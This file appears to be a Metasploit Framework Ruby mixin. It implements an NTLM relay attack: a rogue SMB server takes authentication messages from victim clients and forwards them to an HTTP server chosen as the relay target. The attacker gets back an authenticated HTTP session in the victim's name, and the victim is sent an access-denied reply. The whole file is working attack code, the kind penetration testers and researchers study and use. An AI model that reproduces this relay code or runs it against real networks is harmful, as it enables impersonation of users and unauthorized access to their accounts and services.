###
#
# This mixin provides support for relaying smb logins to http servers
#
###

module Msf::Exploit::Remote::SMB::Server::HttpRelay
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::NTLM::Client
  include Msf::Exploit::Remote::SMB::Server::HashCapture

  def http_client
    @http_client
  end
  def post_login_action(kwargs = {})
    # overload for behavior after login
  end

  def relay_ntlm_type1(ntlm_type1)
    @http_client = Rex::Proto::Http::Client.new(datastore['RELAY_TARGET'],
                                                datastore['rport'],
                                                {},
                                                datastore['SSL'],
                                                datastore['ssl_version'],
                                                proxies,
                                                nil,
                                                nil)
    vprint_status("Connecting to HTTP Target #{datastore['RELAY_TARGET']}")
    @http_client.connect
    vprint_status("Relaying NTLM Message 1 to HTTP Target #{datastore['RELAY_TARGET']}")

    # required to call encode64 on ntlm message
    ntlm_type1.domain.force_encoding('ASCII-8BIT')
    ntlm_type1.workstation.force_encoding('ASCII-8BIT')
    req = @http_client.request_raw(
      {
        'method' => 'GET',
        'uri' => @login_uri,
        'headers' => {
          'Accept-Encoding' => 'identity',
          'Authorization' => 'NTLM ' + ntlm_type1.encode64
        }
      }
    )
    res = @http_client._send_recv(req, @http_timeout, true)
    if res.nil? || res.code != 401
      elog("http_relay did not receive proper challenge request code after sending ntlm_type_1 message.  Received #{res.code}, Expected 401")
      return nil
    end
    @ntlm_type1 = ntlm_type1
    ntlm_type2_b64 = res.headers['WWW-Authenticate'].split[1]
    if ntlm_type2_b64.nil?
      elog("http_relay failed to read ntlm_type2 Message from server response header\n #{res.to_s}")
      return nil
    end
    ntlm_type2 = Net::NTLM::Message.decode64(ntlm_type2_b64)
    @ntlm_type2 = ntlm_type2
    vprint_status('Relaying NTLM Message 2 to SMB Target')
    return @ntlm_type2
  end

  def relay_ntlm_type3(ntlm_type3)
    vprint_status('Received NTLM Type 3 from SMB Client')

    # required to call encode64 on ntlm message
    ntlm_type3.domain = ntlm_type3.domain.force_encoding('ASCII-8BIT')
    ntlm_type3.user = ntlm_type3.user.force_encoding('ASCII-8BIT')
    ntlm_type3.workstation = ntlm_type3.workstation.force_encoding('ASCII-8BIT')
    @ntlm_type3 = ntlm_type3
    vprint_status('Relaying NTLM Type 3 to HTTP Target')
    req = @http_client.request_raw(
      {
        'method' => 'GET',
        'uri' => @login_uri,
        'headers' => {
          'Accept-Encoding' => 'identity',
          'Authorization' => 'NTLM ' + ntlm_type3.encode64
        }
      }
    )
    res = @http_client._send_recv(req, @http_timeout, true)
    if res.nil? || res.code != 404
      elog("http_relay of ntlm_type3 message failed. Server response:\n#{res.to_s}")
      @http_client.close
      return nil
    end

    report_ntlm_type3(
      address: datastore['RELAY_TARGET'],
      ntlm_type1: @ntlm_type1,
      ntlm_type2: @ntlm_type2,
      ntlm_type3: @ntlm_type3
    )
    return @http_client
  end

  class HTTPRelayNTLMProvider < ::RubySMB::Gss::Provider::NTLM
    # @param [::WindowsError::NTStatus] ntlm_type3_status A specific NT Status to return as the response to the NTLM
    #   type 3 message. If this value is nil, the message will be processed as normal.
    def initialize(allow_anonymous: false, allow_guests: false, default_domain: 'WORKGROUP', listener: nil, ntlm_type3_status: ::WindowsError::NTStatus::STATUS_ACCESS_DENIED)
      super(allow_anonymous: allow_anonymous, allow_guests: allow_guests, default_domain: default_domain)
      @listener = listener
      @ntlm_type3_status = ntlm_type3_status
    end

    # Needs overwritten to ensure our version of Authenticator is returned
    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      HTTPRelayAuthenticator.new(self, server_client)
    end

    attr_reader :listener
    attr_accessor :ntlm_type3_status
  end

  class HTTPRelayAuthenticator < ::RubySMB::Gss::Provider::NTLM::Authenticator

    def process_ntlm_type1(type1_msg)
      @ntlm_type1 = type1_msg
      @ntlm_type2 = @provider.listener.relay_ntlm_type1(type1_msg)
      @ntlm_type2
    end

    def process_ntlm_type3(type3_msg)
      http_client = @provider.listener.relay_ntlm_type3(type3_msg)
      unless type3_msg.nil?
        @provider.listener.post_login_action(authenticated_http_client: http_client,
                                             authenticated_username: type3_msg.user.encode('UTF-8'),
                                             authenticated_domain: type3_msg.domain.encode('UTF-8'))
      end
      http_client.close unless http_client.nil?
      return ::WindowsError::NTStatus::STATUS_ACCESS_DENIED
    end

  end
end
